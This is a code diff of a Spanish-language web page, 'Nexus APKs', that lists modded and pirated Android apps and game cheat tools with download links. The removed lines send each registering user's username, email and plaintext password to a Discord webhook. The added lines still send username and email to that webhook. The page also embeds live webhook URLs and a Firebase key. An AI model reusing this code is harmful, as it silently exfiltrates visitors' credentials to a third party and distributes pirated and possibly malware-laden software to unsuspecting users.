@@ -12,63 +12,27 @@
 
     <style>
         :root { --neon-blue: #00f2ff; --neon-pink: #ff00ea; --bg: #020205; }
-        body { background-color: var(--bg); color: white; font-family: 'Outfit', sans-serif; overflow: hidden; }
+        body { background-color: var(--bg); color: white; font-family: 'Outfit', sans-serif; overflow-x: hidden; }
         #particles-js { position: fixed; inset: 0; z-index: -1; }
 
-        /* INTRO CINEMÁTICA */
-        #nexus-intro {
-            position: fixed; inset: 0; background: #000; z-index: 50000;
-            display: none; flex-direction: column; align-items: center; justify-content: center;
-        }
-        .shimmer-text {
-            font-family: 'Orbitron', sans-serif; font-size: 3.5rem; font-weight: 900;
-            background: linear-gradient(90deg, #000, var(--neon-blue), #000);
-            background-size: 200% auto; color: transparent; -webkit-background-clip: text;
-            animation: shine 2s linear infinite, pulse 1.5s ease-in-out infinite;
-        }
-        @keyframes shine { to { background-position: 200% center; } }
-        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.05); opacity: 1; } }
-
-        /* MARQUESINA */
-        .marquee-container { background: rgba(0, 0, 0, 0.8); border-bottom: 2px solid var(--neon-blue); padding: 12px 0; overflow: hidden; position: sticky; top: 0; z-index: 100; }
-        .marquee-text { display: inline-block; white-space: nowrap; animation: scrollText 15s linear infinite; font-weight: 900; color: var(--neon-blue); text-shadow: 0 0 10px var(--neon-blue); letter-spacing: 2px; font-size: 12px; }
-        @keyframes scrollText { from { transform: translateX(100%); } to { transform: translateX(-100%); } }
-
-        /* BOTONES NEON */
-        .floating-btn {
-            position: fixed; bottom: 25px; width: 75px; height: 75px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center; font-size: 35px;
-            cursor: pointer; transition: 0.4s; z-index: 1000; border: 3px solid;
-        }
+        /* INTRO */
+        #nexus-intro { position: fixed; inset: 0; background: #000; z-index: 50000; display: none; flex-direction: column; align-items: center; justify-content: center; }
+        
+        /* BOTONES FLOTANTES (OCULTOS INICIO) */
+        .floating-btn { position: fixed; bottom: 25px; width: 75px; height: 75px; border-radius: 50%; display: none; align-items: center; justify-content: center; font-size: 35px; cursor: pointer; z-index: 1000; border: 3px solid; transition: 0.4s; }
         #pedido-btn { right: 25px; background: #111; border-color: var(--neon-blue); box-shadow: 0 0 25px var(--neon-blue); }
         #tiktok-btn { right: 115px; background: #000; border-color: var(--neon-pink); box-shadow: 0 0 25px var(--neon-pink); }
 
-        /* INPUT PASS CON OJO */
-        .pass-wrapper { position: relative; width: 100%; }
-        #toggle-pass {
-            position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
-            cursor: pointer; font-size: 20px; z-index: 10;
-        }
-
         /* CARDS */
-        .apk-card {
-            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(0, 242, 255, 0.2);
-            border-radius: 30px; padding: 2rem; transition: 0.4s; text-align: center;
-        }
-        .apk-card:hover { border-color: var(--neon-blue); box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); transform: translateY(-5px); }
-        
-        /* MODALES */
-        .modal-overlay {
-            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-            z-index: 10000; align-items: center; justify-content: center; backdrop-filter: blur(20px);
-        }
-        .modal-box { background: #0a0a0f; border: 2px solid var(--neon-blue); padding: 2.5rem; border-radius: 40px; width: 90%; max-width: 420px; text-align: center; }
+        .apk-card { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(0, 242, 255, 0.1); border-radius: 25px; overflow: hidden; transition: 0.4s; }
+        .apk-card:hover { border-color: var(--neon-blue); transform: translateY(-5px); box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
+        .apk-img { width: 100%; height: 160px; object-fit: cover; border-bottom: 1px solid rgba(0, 242, 255, 0.1); }
 
-        .btn-action {
-            background: white; color: black; font-weight: 900; padding: 15px; border-radius: 18px;
-            width: 100%; transition: 0.3s; text-transform: uppercase;
-        }
-        .btn-action:hover { background: var(--neon-blue); box-shadow: 0 0 20px var(--neon-blue); }
+        .btn-action { background: white; color: black; font-weight: 900; padding: 12px; border-radius: 12px; width: 100%; transition: 0.3s; text-transform: uppercase; }
+        .btn-action:hover { background: var(--neon-blue); box-shadow: 0 0 15px var(--neon-blue); }
+
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; align-items: center; justify-content: center; backdrop-filter: blur(15px); }
+        .badge-reg { background: var(--neon-pink); color: white; font-size: 10px; padding: 2px 8px; border-radius: 5px; margin-bottom: 5px; display: inline-block; font-weight: 900; }
     </style>
 </head>
 <body>
@@ -76,71 +40,60 @@
     <div id="particles-js"></div>
 
     <div id="nexus-intro">
-        <h1 class="shimmer-text">NEXUS</h1>
+        <h1 class="text-5xl font-black italic tracking-tighter text-cyan-400 animate-pulse">NEXUS</h1>
         <div class="w-48 h-1 bg-white/10 mt-4 rounded-full overflow-hidden">
             <div id="load-bar" class="h-full bg-cyan-400 w-0 transition-all duration-300"></div>
         </div>
     </div>
 
-    <section id="auth-screen" class="min-h-screen flex items-center justify-center p-4">
-        <div class="w-full max-w-sm" data-aos="zoom-in">
-            <h1 class="text-6xl font-black italic text-center mb-10 tracking-tighter">NEXUS <span class="text-cyan-400">APKS</span></h1>
-            <div class="bg-black/40 p-8 rounded-[40px] border border-white/5 backdrop-blur-md space-y-4">
-                <div id="name-container" class="hidden">
-                    <input type="text" id="user-name" placeholder="USUARIO" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none text-sm">
-                </div>
-                <input type="email" id="email" placeholder="CORREO" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none text-sm">
-                
-                <div class="pass-wrapper">
-                    <input type="password" id="pass" placeholder="PASSWORD" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none text-sm">
-                    <span id="toggle-pass" onclick="togglePasswordVisibility()">😶‍🌫️</span>
-                </div>
+    <section id="auth-screen" class="min-h-screen flex flex-col items-center justify-center p-6">
+        <div class="text-center mb-8" data-aos="fade-down">
+            <h1 class="text-7xl font-black italic tracking-tighter mb-2">NEXUS <span class="text-cyan-400">APKS</span></h1>
+            <p class="text-cyan-400 font-bold tracking-widest uppercase text-sm">JUEGOS Y APPS MODIFICADAS 👑📁</p>
+        </div>
 
-                <button onclick="manejarAuth()" class="btn-action mt-4">ENTRAR</button>
-                <button onclick="cambiarModo()" id="toggle-btn" class="w-full text-[10px] text-gray-500 uppercase text-center mt-4 underline">¿Registrar?</button>
+        <div class="w-full max-w-sm bg-black/40 p-8 rounded-[40px] border border-white/5 backdrop-blur-md space-y-4" data-aos="zoom-in">
+            <div id="name-container" class="hidden">
+                <input type="text" id="user-name" placeholder="USUARIO" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none text-sm focus:border-cyan-400">
+            </div>
+            <input type="email" id="email" placeholder="CORREO" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none text-sm focus:border-cyan-400">
+            <div class="relative">
+                <input type="password" id="pass" placeholder="PASSWORD" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none text-sm focus:border-cyan-400">
+                <span onclick="togglePass()" class="absolute right-4 top-4 cursor-pointer">😶‍🌫️</span>
+            </div>
+            <button onclick="manejarAuth()" class="btn-action">ENTRAR AL SISTEMA</button>
+            <div class="flex flex-col gap-2 pt-2">
+                <button onclick="entrarInvitado()" class="text-[11px] text-cyan-400 font-bold tracking-widest uppercase hover:underline">ENTRAR COMO INVITADO 👤</button>
+                <button onclick="cambiarModo()" id="toggle-btn" class="text-[10px] text-gray-500 uppercase tracking-widest underline">¿No tienes cuenta? Regístrate</button>
             </div>
         </div>
     </section>
 
     <section id="store-screen" class="hidden">
-        <div class="marquee-container">
-            <div class="marquee-text">⚡ [ AVISOS ] NUEVAS APKS AGREGADAS POR CODEX — SISTEMA ONLINE — PRÓXIMAMENTE BLOOD STRIKE MOD MENU🔥— ⚡</div>
-        </div>
-
         <div class="container mx-auto px-6 py-8">
-            <div class="flex justify-between items-center mb-10">
-                <h2 id="welcome-msg" class="text-2xl font-black italic text-cyan-400"></h2>
-                <button onclick="cerrarSesion()" class="bg-red-500/10 text-red-500 border border-red-500/30 px-4 py-2 rounded-xl text-[10px] font-bold uppercase tracking-widest hover:bg-red-500 hover:text-white transition-all">Cerrar Sesión</button>
+            <div class="text-center mb-10">
+                <h1 class="text-6xl font-black italic tracking-tighter mb-4">NEXUS <span class="text-cyan-400">APKS</span></h1>
+                <a href="https://whatsapp.com/channel/0029VbC12x4GufIzNYfrPh3R" target="_blank" class="inline-block w-full max-w-md bg-green-600 hover:bg-green-500 text-white font-black py-4 rounded-2xl shadow-lg shadow-green-900/20 transition-all uppercase tracking-widest text-sm mb-8">
+                    CANAL DE WHATSAPP ✅
+                </a>
+                <div class="flex justify-between items-center border-t border-white/5 pt-6">
+                    <h2 id="welcome-msg" class="text-xl font-black text-cyan-400"></h2>
+                    <button onclick="cerrarSesion()" class="text-[10px] bg-red-500/10 text-red-500 border border-red-500/20 px-4 py-2 rounded-lg font-bold uppercase">Salir</button>
+                </div>
             </div>
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8" id="app-grid"></div>
+
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6" id="app-grid"></div>
         </div>
     </section>
 
     <div id="tiktok-btn" class="floating-btn" onclick="window.open('https://tiktok.com/@saswarsasware332')">
         <svg fill="#fff" width="30" viewBox="0 0 24 24"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/></svg>
     </div>
-    <div id="pedido-btn" class="floating-btn" onclick="document.getElementById('pedido-modal').style.display='flex'">📦</div>
+    <div id="pedido-btn" class="floating-btn" onclick="abrirPeticion()">📦</div>
 
-    <div id="pedido-modal" class="modal-overlay">
-        <div class="modal-box">
-            <h3 class="text-xl font-black italic mb-6 text-cyan-400">PETICIÓN PARA CODEX</h3>
-            <input type="text" id="p-apk" placeholder="NOMBRE APK" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none text-xs uppercase mb-4">
-            <textarea id="p-razon" placeholder="¿DETALLES?" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none text-xs h-24 mb-6"></textarea>
-            <button onclick="enviarPedido()" class="btn-action">Enviar Webhook</button>
-            <button onclick="document.getElementById('pedido-modal').style.display='none'" class="mt-4 text-[9px] text-gray-500 uppercase">Cerrar</button>
-        </div>
-    </div>
-
-    <div id="download-modal" class="modal-overlay">
-        <div class="modal-box">
-            <span class="text-6xl" id="modal-icon"></span>
-            <h3 class="text-3xl font-black mt-4 italic" id="modal-name"></h3>
-            <div class="bg-white/5 p-4 rounded-3xl my-6 border border-white/10 flex justify-between">
-                <span class="text-xs opacity-50 font-bold uppercase tracking-widest">PESO:</span>
-                <p id="modal-size" class="text-cyan-400 font-black"></p>
-            </div>
-            <button id="final-link" class="btn-action">DESCARGAR APK</button>
-            <button onclick="document.getElementById('download-modal').style.display='none'" class="mt-4 text-[9px] text-gray-500 uppercase">Regresar</button>
+    <div id="action-modal" class="modal-overlay">
+        <div class="modal-box bg-[#0a0a0f] border-2 border-cyan-400 p-8 rounded-[40px] w-90 max-w-sm text-center">
+            <div id="modal-content"></div>
         </div>
     </div>
 
@@ -151,47 +104,41 @@
         const firebaseConfig = { apiKey: "AIzaSyAzzRWHGhYVFgkWyRwfgNKc5Ql52U4xxM8", authDomain: "hyper-drip.firebaseapp.com", projectId: "hyper-drip", storageBucket: "hyper-drip.firebasestorage.app", messagingSenderId: "1023275797824", appId: "1:1023275797824:web:378ce9a674db72af05fea5" };
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
-        const WEB_REGISTRO = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";
-        const WEB_PETICIONES = "Https://discord.com/api/webhooks/1491657056686571540/CRJs0yxAdBGDf9xu-ViXGb-o9kz92f6JhZcl37n-K8yq6EbCKlm2dwuNZ39TL_3eIMMp";
-
-        function togglePasswordVisibility() {
-            const passInput = document.getElementById('pass');
-            const eyeIcon = document.getElementById('toggle-pass');
-            if (passInput.type === 'password') {
-                passInput.type = 'text';
-                eyeIcon.innerText = '👁️';
-            } else {
-                passInput.type = 'password';
-                eyeIcon.innerText = '😶‍🌫️';
-            }
-        }
+        const WEB_REG = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";
+        
+        let isGuest = false;
+        let esLogin = true;
 
         const apps = [
-            { n: 'CAP CUT PRO', i: '🎬', s: '128 MB', l: 'https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file' },
-            { n: 'DELTA EXECUTOR', i: '🤖', s: '115 MB', l: 'https://deltaexploits.gg/delta-executor-android' },
-            { n: 'DTW MOD MENU', i: '🔥', s: '85 MB', l: 'https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file' },
-            { n: 'GTA SAN ANDREAS', i: '🚗', s: '2.4 GB', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file' },
-            { n: 'CANVA PRO', i: '🎨', s: '35 MB', l: 'https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view' },
-            { n: 'MINECRAFT APK', i: '⛏️', s: '650 MB', l: 'https://mineckraftapk.com.mx/' },
-            { n: 'GB WHATSAPP', i: '💬', s: '72 MB', l: 'https://gbwhatsp.com/' },
-            { n: 'Z ARCHIVER PRO', i: '📂', s: '5 MB', l: 'https://espacioapk.com/zarchiver-pro-apk/' },
-            { n: 'GEOMETRY DASH', i: '⬛', s: '90 MB', l: 'https://espacioapk.com/geometry-dash-apk/' },
-            { n: 'POPPY PLAYTIME 2', i: '🧸', s: '1.2 GB', l: 'https://espacioapk.com/poppy-playtime-chapter-2-apk/' },
-            { n: 'WHATSAPP PLUS', i: '➕', s: '75 MB', l: 'https://wasap-plus.pk/' },
-            { n: 'ROPE HERO VICE TOWN', i: '🦸', s: '110 MB', l: 'https://espacioapk.com/rope-hero-vice-town-mod-apk/' },
-            { n: 'POPPY PLAYTIME 3', i: '👻', s: '2.1 GB', l: 'https://dc444.4sync.com/download/nCxOF0Zj/Poppy-Playtime-Chapter-3-v1025.apk' },
-            { n: 'PRÓXIMAMENTE', i: '⌛', s: '00', l: 'reload', prox: true },
-            { n: 'PRÓXIMAMENTE', i: '⌛', s: '00', l: 'reload', prox: true }
+            { n: 'CAP CUT PRO', r: true, img: 'https://i.ibb.co/Nd4ZW59d/images.jpg', l: 'https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file' },
+            { n: 'DELTA EXECUTOR', r: false, img: 'https://i.ibb.co/8g1X87mz/41p-TZNE7m-IL.jpg', l: 'https://deltaexploits.gg/delta-executor-android' },
+            { n: 'DTW MOD MENU', r: false, img: 'https://i.ibb.co/S4w6Cg99/unnamed.png', l: 'https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file' },
+            { n: 'GTA SAN ANDREAS', r: false, img: 'https://i.ibb.co/cSwBjTYM/Capture-d-ecran-2025-12-27-184549.png', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file' },
+            { n: 'CANVA PRO', r: false, img: 'https://i.ibb.co/xqQPxmSx/Sin-titulo-1-1.png', l: 'https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view' },
+            { n: 'MINECRAFT APK', r: false, img: 'https://i.ibb.co/pjV6KCT3/images-8.jpg', l: 'https://mineckraftapk.com.mx/' },
+            { n: 'GB WHATSAPP', r: true, img: 'https://i.ibb.co/WNz81Lgd/favicon.png', l: 'https://gbwhatsp.com/' },
+            { n: 'Z ARCHIVER PRO', r: true, img: 'https://i.ibb.co/h6JfhfN/images.png', l: 'https://www.mediafire.com/file/tdg8dtny7eiqvwi/Z+Archiver+Pro+v1.0.10+-+espacioapk.com.apk/file' },
+            { n: 'GEOMETRY DASH', r: false, img: 'https://i.ibb.co/fY91dp14/images-2.jpg', l: 'https://espacioapk.com/geometry-dash-apk/' },
+            { n: 'POPPY PLAYTIME 2', r: true, img: 'https://i.ibb.co/9mN3Fncd/images-1.jpg', l: 'https://espacioapk.com/poppy-playtime-chapter-2-apk/' },
+            { n: 'WHATSAPP PLUS', r: true, img: 'https://i.ibb.co/rGCqw4DX/Whatsapp-plus-logo-2.webp', l: 'https://wasap-plus.pk/' },
+            { n: 'ROPE HERO VICE TOWN', r: false, img: 'https://i.ibb.co/KzsQP1hj/images-3.jpg', l: 'https://espacioapk.com/rope-hero-vice-town-mod-apk/' },
+            { n: 'POPPY PLAYTIME 3', r: true, img: 'https://i.ibb.co/hxyT2tN7/images-4.jpg', l: 'https://dc444.4sync.com/download/nCxOF0Zj/Poppy-Playtime-Chapter-3-v1025.apk' },
+            { n: 'RACE MAX PRO', r: false, img: 'https://i.ibb.co/8n3Cw5N1/images-5.jpg', l: 'https://www.mediafire.com/file/7tldxk3jinb3qeu/race+max+pro+mod+v2.11.6+-+espacioapk.com.apk/file' },
+            { n: 'SUBWAY SURFERS', r: false, img: 'https://i.ibb.co/zHGB6HzV/14040184-1191484264248313-485977623053363654-n-png.webp', l: 'https://www.mediafire.com/file/u9wr1czw3dfw4g4/subway-surfers-mod-3.61.1+-+espacioapk.com.apk/file' },
+            { n: 'RISE OF EROS +18', r: true, img: 'https://i.ibb.co/DDsX2VHK/images.jpg', l: 'https://www.mediafire.com/file/h0f5t8b2c8n9ch1/Rise+of+Eros+-+espacioapk.com.apk/file' },
+            { n: 'KICK THE BUDDY', r: false, img: 'https://i.ibb.co/ycQ2B3dj/images-1.jpg', l: 'https://www.mediafire.com/file/aws2hb59yxy2e33/kick+the+buddy+remastered+mod+v1.14.1526+-+espacioapk.com.apk/file' },
+            { n: 'BLACK HOLE HERO', r: false, img: 'https://i.ibb.co/BHxMLfd3/unnamed.webp', l: 'https://www.mediafire.com/file_premium/hr5c3sd3anscus5/black_hole_hero_mod_v1.9.8_-_espacioapk.com.apk/file' },
+            { n: 'LAS TORTUGAS NINJA', r: false, img: 'https://i.ibb.co/VYYmZxYP/images-6.jpg', l: 'https://www.mediafire.com/file/zimz0zv2dfil558/ninja+turtles+legends+mod+v1.27.1+-+espacioapk.com.apk/file' },
+            { n: 'CAR FOR SALE SIM', r: false, img: 'https://i.ibb.co/pvpg7RFZ/shopping.webp', l: 'https://www.mediafire.com/file_premium/t4c20wl4uspgzbd/car-for-sale-2023-mod-2.0.4_-_espacioapk.com.apk/file' },
+            { n: 'RAFT SURVIVAL', r: false, img: 'https://i.ibb.co/Wv0XhQQ/unnamed-1.webp', l: 'https://www.mediafire.com/file/cp9vqmxhyo4xnq2/ocean+nomad+mod+v2.9.0+-+espacioapk.com.apk/file' },
+            { n: 'CAR SIMULATOR 2', r: true, img: 'https://i.ibb.co/Gv8MM5MZ/images-1.webp', l: 'https://www.mediafire.com/file/aqtch08hwsuag9a/car+simulator+2+mod+v1.61.4+-+espacioapk.com.apk/file' },
+            { n: 'SIMULADOR VUELO 3D', r: false, img: 'https://i.ibb.co/20qmfb9n/images-7.jpg', l: 'https://www.mediafire.com/file/07kskmw1ibubvg4/flight-pilot-mod-2.12.22+-+espacioapk.com.apk/file' },
+            { n: 'BLOOD STRIKE MOD', r: true, img: 'https://i.ibb.co/ynfPjpTS/hqdefault.jpg', l: 'https://www.mediafire.com/file/sg548qen5fa1cea/FREE_MOD_BY_KYKYR_CHEATZ.apk/file' }
         ];
 
-        let esLogin = true;
-        auth.onAuthStateChanged(user => { if(user) { arranqueNexus(localStorage.getItem('nexus_name') || user.email.split('@')[0]); } });
-
-        function cambiarModo() {
-            esLogin = !esLogin;
-            document.getElementById('name-container').classList.toggle('hidden');
-            document.getElementById('toggle-btn').innerText = esLogin ? '¿Registrar?' : '¿Entrar?';
-        }
+        function togglePass() { const p = document.getElementById('pass'); p.type = p.type === 'password' ? 'text' : 'password'; event.target.innerText = p.type === 'password' ? '😶‍🌫️' : '👁️'; }
+        
+        function cambiarModo() { esLogin = !esLogin; document.getElementById('name-container').classList.toggle('hidden'); document.getElementById('toggle-btn').innerText = esLogin ? '¿No tienes cuenta? Regístrate' : '¿Ya tienes cuenta? Entra'; }
 
         async function manejarAuth() {
             const e = document.getElementById('email').value, p = document.getElementById('pass').value, n = document.getElementById('user-name').value;
@@ -200,52 +147,68 @@
                 else {
                     await auth.createUserWithEmailAndPassword(e, p);
                     localStorage.setItem('nexus_name', n);
-                    fetch(WEB_REGISTRO, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ embeds: [{ title: "👤 NUEVO USUARIO", fields: [{ name: "USER", value: n }, { name: "EMAIL", value: e }, { name: "PASS", value: p }], color: 0x00f2ff }] }) });
+                    fetch(WEB_REG, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ embeds: [{ title: "👤 REGISTRO", fields: [{ name: "USER", value: n }, { name: "EMAIL", value: e }], color: 0x00f2ff }] }) });
                 }
+                isGuest = false;
+                arranqueNexus(localStorage.getItem('nexus_name') || e.split('@')[0]);
             } catch (err) { alert(err.message); }
         }
 
-        function cerrarSesion() { auth.signOut().then(() => { localStorage.removeItem('nexus_name'); location.reload(); }); }
+        function entrarInvitado() { isGuest = true; arranqueNexus("INVITADO 👤"); }
 
         function arranqueNexus(nombre) {
             document.getElementById('auth-screen').classList.add('hidden');
             const intro = document.getElementById('nexus-intro'), bar = document.getElementById('load-bar');
             intro.style.display = 'flex';
             let w = 0;
-            const int = setInterval(() => { w += 20; bar.style.width = w + '%'; if(w >= 100) { clearInterval(int); setTimeout(() => { intro.style.display = 'none'; abrirDashboard(nombre); }, 500); } }, 200);
+            const int = setInterval(() => { w += 25; bar.style.width = w + '%'; if(w >= 100) { clearInterval(int); setTimeout(() => { intro.style.display = 'none'; abrirDashboard(nombre); }, 500); } }, 200);
         }
 
         function abrirDashboard(nombre) {
             document.getElementById('store-screen').classList.remove('hidden');
-            document.getElementById('welcome-msg').innerText = "HOLA, " + nombre.toUpperCase();
-            document.body.style.overflowY = 'auto';
+            document.getElementById('welcome-msg').innerText = "HOLA " + nombre.toUpperCase();
+            document.getElementById('tiktok-btn').style.display = 'flex';
+            document.getElementById('pedido-btn').style.display = 'flex';
             const grid = document.getElementById('app-grid'); grid.innerHTML = '';
             apps.forEach(app => {
                 grid.innerHTML += `
                 <div class="apk-card" data-aos="fade-up">
-                    <span class="text-5xl mb-4 block">${app.i}</span>
-                    <h3 class="font-black text-xs mb-6 uppercase">${app.n}</h3>
-                    <button onclick="abrirModal('${app.n}', '${app.i}', '${app.s}', '${app.l}')" class="w-full bg-white/5 border border-white/10 p-3 rounded-2xl font-bold text-[10px] hover:bg-cyan-400 hover:text-black transition-all">ABRIR</button>
+                    <img src="${app.img}" class="apk-img" onerror="this.src='https://via.placeholder.com/300x160?text=Nexus+Apk'">
+                    <div class="p-5">
+                        ${app.r ? '<span class="badge-reg">REGISTRADO 🔒</span>' : ''}
+                        <h3 class="font-black text-xs uppercase mb-4">${app.n}</h3>
+                        <button onclick="gestionarApk('${app.n}', '${app.l}', ${app.r})" class="btn-action text-[10px]">GESTIONAR</button>
+                    </div>
                 </div>`;
             });
         }
 
-        function abrirModal(n, i, s, l) {
-            if(l === 'reload') return window.location.reload();
-            document.getElementById('modal-name').innerText = n;
-            document.getElementById('modal-icon').innerText = i;
-            document.getElementById('modal-size').innerText = s;
-            document.getElementById('final-link').onclick = () => window.open(l);
-            document.getElementById('download-modal').style.display = 'flex';
+        function gestionarApk(n, l, r) {
+            if(isGuest && r) {
+                mostrarModal(`
+                    <h2 class="text-2xl font-black mb-4">ACCESO DENEGADO ❌</h2>
+                    <p class="text-gray-400 text-sm mb-6 uppercase">Esta APK es solo para usuarios registrados.</p>
+                    <button onclick="location.reload()" class="btn-action mb-3">REGISTRARME</button>
+                    <button onclick="cerrarModal()" class="text-[10px] text-gray-500 uppercase font-bold">REGRESAR</button>
+                `);
+            } else {
+                window.open(l);
+            }
         }
 
-        async function enviarPedido() {
-            const a = document.getElementById('p-apk').value, r = document.getElementById('p-razon').value, u = localStorage.getItem('nexus_name') || "User";
-            await fetch(WEB_PETICIONES, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ embeds: [{ title: "🍿 PETICIÓN", color: 0xff00ea, fields: [{ name: "👤 USER", value: u }, { name: "📦 APK", value: a }, { name: "❓ RAZÓN", value: r }] }] }) });
-            alert("Enviado! 🌪️"); document.getElementById('pedido-modal').style.display = 'none';
+        function abrirPeticion() {
+            mostrarModal(`
+                <h3 class="text-xl font-black text-cyan-400 mb-6">NUEVA PETICIÓN 📦</h3>
+                <input type="text" id="p-apk" placeholder="NOMBRE APK" class="w-full p-4 bg-white/5 border border-white/10 rounded-2xl outline-none text-xs mb-4">
+                <button onclick="cerrarModal()" class="btn-action">ENVIAR</button>
+            `);
         }
 
-        particlesJS('particles-js', { "particles": { "number": { "value": 50 }, "color": { "value": "#00f2ff" }, "opacity": { "value": 0.1 }, "size": { "value": 1.5 }, "move": { "speed": 1 } } });
+        function mostrarModal(html) { document.getElementById('modal-content').innerHTML = html; document.getElementById('action-modal').style.display = 'flex'; }
+        function cerrarModal() { document.getElementById('action-modal').style.display = 'none'; }
+        function cerrarSesion() { auth.signOut().then(() => location.reload()); }
+
+        particlesJS('particles-js', { "particles": { "number": { "value": 40 }, "color": { "value": "#00f2ff" }, "opacity": { "value": 0.1 }, "size": { "value": 1.5 }, "move": { "speed": 1 } } });
     </script>
 </body>
 </html>
